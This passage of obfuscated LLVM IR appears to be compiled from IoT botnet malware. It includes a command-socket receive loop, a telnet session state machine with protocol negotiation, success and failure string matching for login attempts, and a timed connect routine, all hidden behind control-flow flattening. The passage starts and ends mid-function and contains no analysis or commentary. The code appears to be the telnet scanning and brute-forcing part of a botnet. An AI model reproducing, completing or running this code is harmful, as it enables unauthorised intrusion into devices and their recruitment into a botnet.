  store i32 -1427511436, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 488906380, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 -1344088570, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 2031979331, i32 -986413188
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 -815737764, i32 -1554481409
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 1119274024, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 -388091092, i32 1280946076
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 -986413188, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 -1344088570, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* %18, align 4
  store i32 %119, i32* %4, align 4
  store i32 1119274024, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %4, align 4
  ret i32 %121

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #2
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1840062899, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1840062899, label %first
    i32 1518476543, label %28
    i32 977048989, label %32
    i32 -1129138240, label %38
    i32 537428823, label %39
    i32 -104980551, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 1518476543, i32 977048989
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 977048989, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1129138240, i32 537428823
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -104980551, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -104980551, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 -1253836331, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1253836331, label %18
    i32 -238067045, label %27
    i32 -1420426427, label %44
    i32 -1466120308, label %45
    i32 2032574453, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #2, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 -238067045, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -1420426427, i32 -1466120308
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 2032574453, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 2032574453, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1435268459, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -1435268459, label %NodeBlock
    i32 -1473589140, label %LeafBlock1
    i32 -1495694757, label %LeafBlock
    i32 78849365, label %16
    i32 -1992580192, label %17
    i32 851269475, label %26
    i32 1193779913, label %27
    i32 -165186408, label %34
    i32 1668432702, label %35
    i32 1966270577, label %42
    i32 1013515221, label %50
    i32 298241185, label %58
    i32 40486767, label %59
    i32 667829354, label %60
    i32 586205327, label %NewDefault
    i32 -908642093, label %67
    i32 -1095636018, label %68
    i32 878385812, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1495694757, i32 -1473589140
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 78849365, i32 586205327
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -1992580192, i32 586205327
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 878385812, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 851269475, i32 1193779913
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 667829354, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 -165186408, i32 1668432702
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 40486767, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 1966270577, i32 1013515221
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 298241185, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 298241185, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 40486767, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 667829354, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -1095636018, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -908642093, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1095636018, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 878385812, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -1518394199, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1518394199, label %8
    i32 -1206914059, label %17
    i32 147765112, label %18
    i32 87839527, label %19
    i32 -290266562, label %24
    i32 331863315, label %34
    i32 -579227944, label %35
    i32 2001651684, label %36
    i32 177763216, label %39
    i32 -625417161, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 -1206914059, i32 147765112
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1518394199, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 87839527, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -290266562, i32 177763216
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  %33 = select i1 %32, i32 331863315, i32 -579227944
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -625417161, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  store i32 2001651684, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 87839527, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -625417161, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %3, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %36, %35, %34, %24, %19, %18, %17, %8, %switchDefault
  br label %loopEntry
}

declare i32 @strcasestr(...) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1539879246, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1539879246, label %first
    i32 1938573935, label %8
    i32 1593462576, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 1938573935, i32 1593462576
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 1593462576, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 2084248367, i32* %switchVar
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2084248367, label %first
    i32 -1986811872, label %7
    i32 1031236525, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp ne i32 %.reload, 0
  %6 = select i1 %5, i32 1031236525, i32 -1986811872
  store i32 %6, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  %8 = load i8*, i8** %2, align 8
  %9 = call i32 @contains_fail(i8* %8)
  %10 = icmp ne i32 %9, 0
  store i32 1031236525, i32* %switchVar
  store i1 %10, i1* %.reg2mem2
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %12 = zext i1 %.reload3 to i32
  ret i32 %12

loopEnd:                                          ; preds = %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 937848431, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 937848431, label %first
    i32 -2005441659, label %37
    i32 1503923694, label %38
    i32 914434600, label %47
    i32 480576680, label %52
    i32 -1980204997, label %57
    i32 1218922577, label %66
    i32 717319702, label %83
    i32 -1306275349, label %90
    i32 -2073624381, label %91
    i32 -1546675249, label %92
    i32 -1074283419, label %93
    i32 -1834102487, label %94
    i32 -359654298, label %95
    i32 1349745116, label %96
    i32 -352880903, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -2005441659, i32 1503923694
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -352880903, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 914434600, i32 1349745116
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 480576680, i32 -1834102487
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1980204997, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #2, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 1218922577, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
